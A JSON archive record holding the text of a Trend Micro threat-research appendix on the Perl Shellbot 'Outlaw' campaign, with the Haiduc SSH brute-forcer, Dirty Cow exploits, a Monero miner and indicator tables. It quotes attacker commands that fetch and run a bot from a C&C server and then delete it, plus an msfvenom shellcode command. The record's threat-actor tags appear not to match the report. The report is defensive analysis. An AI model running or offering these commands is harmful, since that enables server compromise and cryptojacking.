{
    "id": "d366e70d-29a8-4eb3-98b2-082433349cf2",
    "created_at": "2022-10-25T16:48:20.542372Z",
    "updated_at": "2025-03-27T02:09:29.30178Z",
    "deleted_at": null,
    "sha1_hash": "f266db92024c438a40b8ca41f40c8f3887cdffd9",
    "title": "",
    "authors": "",
    "file_creation_date": "2018-10-29T14:56:14Z",
    "file_modification_date": "2018-10-29T14:56:14Z",
    "file_size": 1544394,
    "plain_text": "Perl-Based Shellbot Looks toTarget Organizations via C&CAppendixTrendLabs Security Intelligence BlogTrend Micro Cyber Safety SolutionsTeamNovember2018\n\n\n-----\n\nBelow is an overview of the most significant findings of the files from the compromised FTP\nrelated to the operation.80 million IP addresses generated with the set of parameters\n\nThe compromised FTP contained various files and tools the attackers used. The first files found\nwere configuration files for some toolsets. From part of one script, we recovered code that we\nused to obtain a list of 80 million IP addresses. Further research suggested it was the way to\ngenerate a randomized target list, which would make uncovering the real target within the\ndecoy systems more difficult.\n\n_\".d.php\" returned all the parameters. Submitting each parameter to the URL_\n_/128[.]199[.]255[.]180/src/[.]xpf/ips/$param returns a list of IP addresses for each particular_\nparameter.\n\n_Figure 1. Parameter returns an IP address_\n\nAll the IP addresses were saved on the lists, called by the invoking parameter with the\nfollowing script:\n\n\n-----\n\n_Figure 2. Script saving all the listed IP addresses into a text file_\n\n_Figure 3. All the downloaded files_\n\nThe supposed studio or the site itself has no business relevance, with no domain name\nlinked to its business. It is likely that the whole website is just a covert page used to\nconfuse the researchers and to disguise their operations.\nThe configuration file for the IRC bouncer found on the compromised FTP\n\nThis was the only seemingly working version of the toolset in development. It had various\nparts of open-source codes from other operations, and its initial purpose was to build an\nIRC-operated XMR miner with the ability to mask itself as another process. The Linux\nhacking tool “Shark” was found within these files.\n\n_Figure 4 and 5. Comments in the Romanian language re: the IRC bouncer_\nHacking tools found\n\nWe also found open-source hacking tools with custom wrap-up bash scripts with\ncomments written in the Romanian language. Among the files, there was a new toolkit\n\n\n-----\n\ncalled Haiduc (detected by Trend Micro as Hacktool.Linux.SSHBRUTE.A), which translates\nto \"An Outlaw,\" that was not seen before. It is, however, found for download on the\nwebsite, arhivecodex[.]tk, which also hosts speed.py, the script for a performance check\nrelated to a Monero mining rig.\n\n_Figure 6. Screenshot of the website's front page_\n\nThe hacking tool was tested to scan the C&C servers while monitoring the traffic. It simply\nbrute forced the SSH for credentials using the given wordlist, which was also captured\nfrom the hackers (the group which we named “Outlaw”). We tested whether this is some\ntrap for script kiddies, but Haiduc did only what it was supposed to do — brute force the\nSSH credentials with the list of targets and wordlist. According to the content of the\n\"Classes\" directory (discussed later in this document), the tool is ready to be used for\ncyberattacks against listed companies, either to perform DDoS attacks or brute force the\nSSH service credentials on the target’s server, with a randomized order of the scanned IP\naddresses to make the detection more difficult.\nDetails of Haiduc toolkit files\n\nWe discussed the Haiduc kit toolset in the blog, including the ways hackers used it. Here,\nwe discuss its toolset with the bash wrappers, including so-called \"Class files\". Each class\n\n\n-----\n\nfile stands for a certain company and contains the first two octets of a subnet. Other scripts\nfrom the toolkit generate the remaining two octets of the IP address for scanning. Running\n_Haiduc also revealed a list of compromised devices, with more than 185,000 distinct IP_\naddresses.\n\n_Figure 7. A class file listing different companies, where “a” is a shell script wrapper for_\n\nHaiduc\n\n\n-----\n\n_Figure 8. Accepts parameters such as the number of threads to run (threads), password list_\n\n_(passfile), and port number port)_\n\n_Figure 9. File “all”, which is a list of values \"./x 1; \" from 1-225_\n\n_Figure 10. File “all”, which is a list of values \"./x 1; \" from 1-225_\n\nThe file, gasite.txt, contains the loot and is the final output of the Haiduc tool, where the brute\nforcing resulted in 65,288 possibly compromised hosts.\n\n\n-----\n\n_Figure 11. The file Hu keeps names of certain countries/classes_\n\n_Figure 12. The file Ovh generates a wordlist of 234 certain usernames._\n\n_Figure 13. The Pass wordlist generates another wordlist of 790 lines._\n\nThe file, _R, is a randomness generator for the scanner wrapper file, a, which makes the_\nscanning more difficult to identify.\n\n\n-----\n\n_Figure 14. R file_\n\n_Figure 15. The Range file verifies the scanning range._\n\n_Figure 16. The file, x, is a bash wrapper shell for the wrapper script “h”_\n\n\n-----\n\n_Figure 17. Classes_\n\nThese \"classes\" are the first two octets from subnetworks (subnet) of the abovementioned\ncompanies. As shown in the examples below.\n\n_Figure 18. 21vianet_\n\n\n-----\n\n_Figure 19. Facebook_\n\n_Figure 20. Classes sorted by the size/number of eventual subnets_\n\n\n-----\n\n_Figure 21. Classes sorted by number of lines = number of subnets to be attacked by the_\n\n_hackers = perimeter size_\nThe list of the hosts, compromised with Haiduc\n\nAmong the files found on the compromised FTP server, there is also a list of the hosts\ncompromised using the Haiduc tool. It is a 65 thousand-long list of IP addresses,\nusernames, and passwords for SSH access. The list of targets include smart devices,\nservers, and network components, among others.\n\nThe following are only some of the compromised hosts:\n\n    - Firewall of a hotel in South Korea: We detected two backdoors in their root file\nsystem. We notified the Korean CERT and have yet to receive a response at the\ntime of writing.\n\n\n-----\n\n_Figure 22. History of the commands that the hackers ran on the target system_\n\n- Cowrie-based honeypot devices, marked as OS Linux svr04 3.2.0-4-amd64 and\nLinux Ubuntu 3.2.0-4-amd64\n\n- A smart car charging system running on Linux Ubuntu 3.2.0-4-amd64\n\n_Figure 23. Compromised host related to a smart car charging system_\n\n- A VPN gateway, with a password that was already changed\n\n- A network switch\n\n\n-----\n\n_Figure 24. Compromised host related to a network switch_\n\n- Database server misused to mine Monero via the coinminer file xmrig-2.5.3-xenial_amd64.tar (detected by Trend Micro as Coinminer_MALXMR.SMGH2-ELF64)._\n\n_Figure 25. The configuration of the miner used_\n\n\n-----\n\n_Figure 26. The corresponding wallet address was found with 1.161 XMR at the time of_\n\n_writing_\nExploits found related to Ubuntu\n\nThe Ubuntu privilege exploit was found in the file, Non, which is another privilege escalation\n[tool related to the exploit for CVE-2017-16995.](https://www.exploit-db.com/exploits/44298/)\n\n_Figure 27. Suspicious strings found in the file, non_\n\nThe threat actors used a variant of a hacking tool called \"Faker\" to spoof the properties of\nthe process running after the initial exploitation to mask the malware-related process.\nSpecifically, this was used to hide the IRC C&C communications from security monitoring\nduring the initial exploitation. It was also used to disguise the Monero miner.\n\n_Figure 28. The file, h.c, is also the hacking tool Faker_\n\n\n-----\n\nThe next exploits found on the system were based on Pokemon and Dirty Cow with a\ncustomized variant of shellcode (The Pokemon exploit is also based on the Dirty Cow\nvulnerability.).\n\n_Figure 29. Pokemon and Dirty Cow-related exploits_\n\n[Dirty Cow](https://blog.trendmicro.com/trendlabs-security-intelligence/new-flavor-dirty-cow-attack-discovered-patched/) is a vulnerability that affects all Linux-based operating systems and even\nAndroid. It is a local privilege escalation bug that can be used with other exploits to allow\nremote execution to get root access on the host. The other exploit was the aforementioned\n_non file in this case._\n\nShellcode was generated with the command “msfvenom -p linux/x64/exec CMD=/bin/bash\n_PrependSetuid=True -f elf | xxd -I\". In this case, it is a standard shellcode generated by the_\nMetasploit suite msfvenom tool. This toolset is popular in the cybercriminal underground\nbecause it is open-source and readily available, and that it still works on most systems.\n\n_Figure 30. Dirty Cow exploit ready to use with custom shellcode_\nCARP, the HA (high availability) cluster of C&Cs\n\nCommon Address Redundancy Protocol (CARP) is a pfsense tool that can be used to build\na firewall failover or IPSec base channel between two hosts. According to the file\n\n\n-----\n\n_config.log, it seems to be used to create HA cluster from both of the hacked hosts_\n_mail[.]rajukdhaka[.]gov[.]bd (202.79.16.178) and hxxp://www[.]nichido-_\n_museum[.]or[.]jp/english/ (ftp://museum@museum04@153[.]122[.]156[.]232/Mail/n3)._\n\n_Figure 31. CARP and config.log from hacked host_\nIndicators of Compromise (IoCs)\n\n**Indicator** **Attribution/Description**\n\n|Indicator|Attribution/Description|\n|---|---|\n|153.122.156.232|FTP server|\n|202.79.16.178|Server|\n|54.37.72.170|C&C server Luci[.]madweb[.]ro|\n|42.63.154.190|New IP found in C&C communication from Host #1|\n|149.56.134.241|New IP found in C&C communication from Host #1|\n|49.51.172.224|New IP found in C&C communication from Host #1|\n|195.154.43.102|https://www[.]shodan[.]io/host/19 5[.]154[.]43[.]102|\n|Wireshark filter for any traffic related to any at least suspected C&C||\n|ip.addr==153.122.156.232|Network traffic for suspected C&C IP add|\n|ip.addr==202.79.16.178|Network traffic for suspected C&C IP add|\n|ip.addr==54.37.72.170|Network traffic for suspected C&C IP add|\n\n\n-----\n\n|ip.addr==42.63.154.190|Network traffic for suspected C&C IP add|\n|---|---|\n|ip.addr==149.56.134.241|Network traffic for suspected C&C IP add|\n|ip.addr==49.51.172.224|Network traffic for suspected C&C IP add|\n|IP addresses spreading the infection as of writing||\n|61.8.73.166||\n|195.154.43.102||\n|107.1.153.75||\n|218.25.74.221||\n|69.64.62.159||\n|54.37.72.170||\n|128.199.255.180|Hosted PHP script that generated the 80M list of IP’s|\n|123.207.28.85|C&C that leads to epla backdoor|\n|132.232.43.102||\n|42.63.154.190|Infected host #1 asked C&C about this IP|\n|hxxp://arhivecodex[.]tk/info|URL|\n|hxxp://sm0k3rnr1[.]000webhostapp[.]com/mata.pl|Similar infections, but points to a different IRC chat|\n|luci.madweb[.]ro|IRC bouncer hosting C&C server|\n\n|SHA256 for the files|Col2|Col3|\n|---|---|---|\n|d9cdf78bf6a71a8f8e00bbd2cfc6caefeae375dcc2a466 de51317ad2e5be6400|brute|ELF_MADVISE.DKG|\n|81d19b8d6a76f8501bbe2f3235821155597c56019eac 45da12a5cc3c860fbff8|n3|PERL_SHELLBOT.S M|\n|6318b936ce6493f2c3c6c13535e5647c1c834ad4e571 df9ed69a8e77169e01c7|nux2.6|ELF_SONEX.SMA|\n|3e527f293b775d46f377a12b6a31415f38540a5643127 18c656cbd1735200770|pscan|ELF_MADVISE.DKG|\n|Dirty Cow files|||\n\n\n-----\n\n|16d84dd4c80d54cbe17c4bac328f1bb496da79fbcb90 5ebcab01b0eb1f975d41|c0w|Trojan.Linux.MADVI SE.AA|\n|---|---|---|\n|aca6bd0565422b69198343881b642a50371ddba8a5c 95dee8b32f38e1d882c56|cowroot|Trojan.Linux.MADVI SE.AA|\n|a75a4e09637cae521c4e169f1ecb622d5d116b121ff8c 8f3da094393a46692a8|d|ELF64_MADVISE.B|\n|d1f83570650c3f09f6bd5e807f3480b28af6c09d82dd52 3c8b1664d26cc04300|dirtyc0w|ELF64_MADVISE.B|\n|809fa09a304eebd30f81cdb91d7facdb90ed609df11ef5 b545e1a671348fc9f6|dirtycow-mem|ELF64_MADVISE.B|\n|2f5147a3d540fd55cd52183a22829b1789861cef4b194 c545421db5dca764045|dirty_passwd_adjust_cow|ELF64_MADVISE.B|\n|Haiduc toolset files|||\n|cfa35cc144a91db98660140913c1b9fbf4bdc00ac8f90 3a9ff76b3a3095a889f|epla|ELF_SONEX.SMA|\n|6163a3ca3be7c3b6e8449722f316be66079207e49383 0c1cf4e114128f4fb6a4|haiduc|Hacktool.Linux.SSH BRUTE.A|\n|bd65f76cd0a45d5bf71e8c77fd1be36d3c7cbcd41c737 59c4b825914ff87b9ac|xmrig-2.5.3-xenial-amd64.tar.gz|Coinminer_MALXMR .SMGH2-ELF64|\n\n\n**SSH usernames:**\nluci\nlucian\ndragos\nmazy\nhydra\nPoseidon\nCodex\nC0dex\n\n**Commands used:**\n\nSource Command\n\n107.1.153.75 _uname -a; wget hxxp://54[.]37[.]72[.]170/n3; curl -O hxxp://54[.]37[.]72[.]170/n3; perl_\n_n3; rm -rf n3; rm -rf n3.*_\n\n195.154.43.102 _uname -a; wget ftp://museum:museum04@153[.]122[.]156[.]232/Mail/n3; rm -rf n3;_\n_rm -rf n3.*_\n\n218.25.74.221 _uname -a; wget hxxp://54[.]37[.]72[.]170/n3; curl -O hxxp://54[.]37[.]72[.]170/n3; perl_\n_n3; rm -rf n3; rm -rf n3.*_\n\n61.8.73.166 _uname -a; wget hxxp://54[.]37[.]72[.]170/n3; curl -O hxxp://54[.]37[.]72[.]170/n3; perl_\n_n3; rm -rf n3; rm -rf n3.*_\n\n61.8.73.166 _uname -a; wget hxxp://54[.]37[.]72[.]170/n3; curl -O hxxp://54[.]37[.]72[.]170/n3; perl_\n_n3; rm -rf n3; rm -rf n3.*;wget hxxp://54[.]37[.]72[.]170/n.tgz;tar -xzvf n.tgz;rm -rf_\n_n.tgz;cd .s;./run;cd /tmp_\n\n69.64.62.159 _uname -a;cd /tmp;wget hxxp://54[.]37[.]72[.]170/n3;perl n3;rm -rf n3*_\n\n\n-----\n\nTrend Micro Incorporated, a global leader in cybersecurity solutions, helps to make the\nworld safe for exchanging digital information. Our innovative solutions for consumers,\nbusinesses, and governments provide layered security for data centers, cloud\nenvironments, networks, and endpoints. All our products work together to seamlessly\nshare threat intelligence and provide a connected threat defense with centralized\nvisibility and investigation, enabling better, faster protection.\n\nWith almost 6,000 employees in over 50 countries and the world’s most advanced\nglobal threat intelligence, Trend Micro enables organizations to secure their connected\nworld. For more information, visit www.trendmicro.com.\n\n©2018 by Trend Micro, Incorporated. All rights reserved. Trend Micro and the Trend\nMicro t-ball logo are trademarks or registered trademarks of Trend Micro, Incorporated.\nAll other product or company names may be trademarks or registered trademarks of\ntheir owners.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://documents.trendmicro.com/assets/Perl-Based_Shellbot_Looks_to_Target_Organizations_via_C&C_appendix.pdf"
    ],
    "report_names": [
        "Perl-Based_Shellbot_Looks_to_Target_Organizations_via_C&C_appendix.pdf"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716500,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1540824974,
    "ts_modification_date": 1540824974,
    "files": {
        "pdf": "https://archive.orkl.eu/f266db92024c438a40b8ca41f40c8f3887cdffd9.pdf",
        "text": "https://archive.orkl.eu/f266db92024c438a40b8ca41f40c8f3887cdffd9.txt",
        "img": "https://archive.orkl.eu/f266db92024c438a40b8ca41f40c8f3887cdffd9.jpg"
    }
}